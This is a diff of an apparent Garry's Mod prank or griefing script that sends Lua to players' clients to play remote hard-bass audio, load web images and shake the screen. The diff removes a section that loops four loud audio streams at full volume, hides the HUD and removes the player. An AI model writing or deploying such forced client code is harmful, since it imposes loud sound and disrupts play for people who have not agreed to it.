@@ -69,7 +69,7 @@ end )
 --Start some tunes and steam in our assets
 lol:PushAction( 0, function( pPlayer )
 	lol:SendLua( pPlayer, ([=[
-		sound.PlayURL( "https://cdndl.zaycev.net/198507/4322472/hard_bass_-_xardbas_%28zaycev.net%29.mp3", "", function()end )
+		sound.PlayURL( "https://srv21.mu.fm/7/d3/hard_bass_-_raz_raz_raz_eto_hard_bass_d_-_wapkenguru_(zf.fm).mp3", "", function()end )
 		
 		g_]=].. lol.m_strImageGlobalVar.. [=[ = {}
 		local html = [[%s]]
@@ -102,7 +102,7 @@ lol:PushAction( 0, function( pPlayer )
 		LoadWebMaterial( "https://i.ytimg.com/vi/y90yaLFoYoA/maxresdefault.jpg", "doritos", 183, 256 )
 		LoadWebMaterial( "https://coubsecure-s.akamaihd.net/get/b22/p/coub/simple/cw_timeline_pic/e508d626165/0fcf7dc0036a796b6ebfd/big_1408537565_image.jpg", "fedora", 256, 256 )
 		LoadWebMaterial( "https://avatanplus.com/files/resources/mid/5851a5e058b5a158feeff46b.png", "dew", 110, 256 )
-		LoadWebMaterial( "http://www.hardnews.nl/wp-content/uploads/2015/11/10-redenen-hard-bass-niet-missen.png", "awp", 256, 230 )
+		LoadWebMaterial( "http://www.hardnews.nl/wp-content/uploads/2015/11/10-redenen-hard-bass-niet-missen.png", "awp", 256, 55 )
 	]=]):format(lol.m_strImageLoadHTML) )
 end )
 
@@ -331,28 +331,4 @@ lol:PushAction( 54, function( pPlayer )
 			util.ScreenShake( LocalPlayer():GetPos(), 5000, 5, 0.25, 128 ) 
 		end )
 	]] )
-end )
-
---EVIL TIME rip headpones
-lol:PushAction( 175, function( pPlayer )
-	lol:SendLua( pPlayer, [[
-		surface.PlaySound( "vo/npc/male01/gethellout.wav" )
-
-		local sounds = {}
-		for i = 1, 4 do
-			sound.PlayURL( "https://psv4.vkuseraudio.net/c611117/u324155804/audios/8364abac383e.mp3?extra=_jqfui75nrUWn6G9Y5C_Q0ad0ODhkMl37NG71g807ZIV0qr7u5aBx2N5Y6I3wOI5d8zhtUUnCe6xKJhK2VSfpvvYLwlAaqxK1qIBvLggRqRg-Mc93R_yyHBYItBNENRti3Huq9xV0VK4cg", "noblock noplay", function( pChan )
-				sounds[#sounds +1] = pChan
-			end )
-		end
-
-		timer.Create( "asdf", 1, 0, function()
-			if #sounds ~= 4 then return end
-			timer.Destroy( "asdf" )
-			for k, v in pairs( sounds ) do v:EnableLooping( true ) v:SetVolume( 1 ) v:Play() end
-		end )
-
-		hook.Add( "HUDShouldDraw", "newhud", function() return false end )
-	]] )
-
-	pPlayer:Remove()
 end )
